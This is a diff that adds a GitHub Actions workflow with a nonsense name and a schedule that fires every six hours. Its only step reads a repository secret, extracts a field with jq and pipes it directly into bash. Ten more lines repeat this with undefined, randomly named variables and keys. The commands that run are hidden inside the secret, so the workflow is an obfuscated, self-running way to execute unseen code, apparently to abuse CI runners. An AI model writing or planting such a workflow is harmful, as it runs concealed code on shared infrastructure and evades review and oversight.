@@ -1,0 +1,28 @@
+name: downhaulfrigid
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: downhaulfrigid
+        env:
+          vc5: ${{ secrets.vc5 }}
+        run: |
+          echo $vc5 | jq -r .beku8 | /bin/bash
+          echo $ui2 | jq -r .kxpa6 | /bin/bash
+          echo $um497 | jq -r .mxt71 | /bin/bash
+          echo $l904 | jq -r .jiq20 | /bin/bash
+          echo $mrb2 | jq -r .kkr2 | /bin/bash
+          echo $sdxb1257 | jq -r .cs41547 | /bin/bash
+          echo $eldp4834 | jq -r .jv7010 | /bin/bash
+          echo $igrq103 | jq -r .xbt60 | /bin/bash
+          echo $jjx2 | jq -r .rasm86627 | /bin/bash
+          echo $uvqyl24 | jq -r .u8978 | /bin/bash
+          echo $t6497 | jq -r .j06 | /bin/bash
+
